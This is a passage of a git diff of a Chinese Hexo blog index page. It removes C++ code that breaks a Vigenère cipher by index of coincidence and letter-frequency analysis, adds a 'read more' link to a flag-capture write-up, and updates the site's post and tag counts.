class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;i+j*klen&lt;clen;j++)</span><br><span class="line"></span><br><span class="line">		   out[(<span class="keyword">int</span>)(c[i+j*klen]-<span class="string">'a'</span>)]++;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">float</span> e=<span class="number">0.000f</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> L=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)    <span class="comment">//子串密文长度 </span></span><br><span class="line"></span><br><span class="line">            L+=out[k];</span><br><span class="line"></span><br><span class="line">        L*=(L<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)        <span class="comment">//分组计算重合指数IC </span></span><br><span class="line"></span><br><span class="line">	       <span class="keyword">if</span>(out[k]!=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	           e=e+((<span class="keyword">float</span>)out[k]*(<span class="keyword">float</span>)(out[k]<span class="number">-1</span>))/(<span class="keyword">float</span>)L;</span><br><span class="line"></span><br><span class="line">		IC[i]=e;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)</span><br><span class="line"></span><br><span class="line">	   avgIC+=IC[i];</span><br><span class="line"></span><br><span class="line">	avgIC/=klen;          <span class="comment">//求IC的平均值  </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (avgIC &gt;= <span class="number">0.06</span>)  <span class="keyword">break</span>;    <span class="comment">//判断退出条件，重合指数的平均值是否大于0.06 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>  klen++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cout</span>&lt;&lt;<span class="string">"密钥长度为："</span>&lt;&lt;klen&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="逐个破解秘钥字母"><a href="#逐个破解秘钥字母" class="headerlink" title="逐个破解秘钥字母:"></a>逐个破解秘钥字母:</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> klen=;<span class="comment">//输入求出的秘钥长度； </span></span><br><span class="line">	<span class="keyword">char</span> c[<span class="number">5000</span>]=<span class="string">""</span>;<span class="comment">//输入密文； </span></span><br><span class="line">     <span class="keyword">int</span> clen=<span class="built_in">strlen</span>(c);</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> p[] = &#123;<span class="number">0.08167</span>, <span class="number">0.01492</span>, <span class="number">0.02782</span>, <span class="number">0.04253</span>, <span class="number">0.12702</span>, <span class="number">0.02228</span>, <span class="number">0.02015</span>, <span class="number">0.06094</span>, <span class="number">0.06966</span>, <span class="number">0.00153</span>, <span class="number">0.00772</span>, <span class="number">0.04025</span>,<span class="number">0.02406</span>, <span class="number">0.06749</span>, <span class="number">0.07507</span>, <span class="number">0.01929</span>, <span class="number">0.00095</span>, <span class="number">0.05987</span>, <span class="number">0.06327</span>, <span class="number">0.09056</span>, <span class="number">0.02758</span>, <span class="number">0.00978</span>, <span class="number">0.02360</span>, <span class="number">0.00150</span>,<span class="number">0.01974</span>, <span class="number">0.00074</span>&#125;;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> key[<span class="number">100</span>]=&#123; <span class="number">0</span> &#125;;    <span class="comment">//存放密钥 </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//统计分组字母个数 </span></span><br><span class="line"></span><br><span class="line">	&#123;	</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">int</span> g=<span class="number">0</span>;   <span class="comment">//密文移动g个位置 </span></span><br><span class="line"></span><br><span class="line">	  <span class="keyword">for</span>(<span class="keyword">int</span> t=<span class="number">0</span>;t&lt;<span class="number">26</span>;t++)</span><br><span class="line"></span><br><span class="line">	  &#123;</span><br><span class="line"></span><br><span class="line">	 	<span class="keyword">float</span> x=<span class="number">0.00000f</span>;    <span class="comment">//拟重合指数 	</span></span><br><span class="line"></span><br><span class="line">	    <span class="keyword">int</span> out[<span class="number">26</span>]=&#123; <span class="number">0</span> &#125;;   <span class="comment">//盛放字母个数的数组</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;i+j*klen&lt;clen;j++)</span><br><span class="line"></span><br><span class="line">		   out[(<span class="keyword">int</span>)(c[i+j*klen]-<span class="string">'a'</span>)]++;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> L=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)&#123;      <span class="comment">//子串密文长度 </span></span><br><span class="line"></span><br><span class="line">            L+=out[k];&#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="number">26</span>;k++)&#123; </span><br><span class="line"></span><br><span class="line">            x=x+p[k]*out[(k+g)%<span class="number">26</span>];&#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(x/L&gt;<span class="number">0.055</span>) &#123;</span><br><span class="line"></span><br><span class="line">        	key[i]=g;</span><br><span class="line"></span><br><span class="line">        	<span class="keyword">break</span>;	&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> g++;</span><br><span class="line"></span><br><span class="line">	   &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="string">"加密密钥为："</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;klen;i++)    <span class="comment">//输出密钥字 </span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="keyword">char</span> (<span class="string">'a'</span>+key[i]);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-          
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/12/25/%E5%9C%A3%E8%AF%9E%E5%A4%BA%E6%97%97admin-wp/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2007,7 +1841,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2018,7 +1852,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2029,7 +1863,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
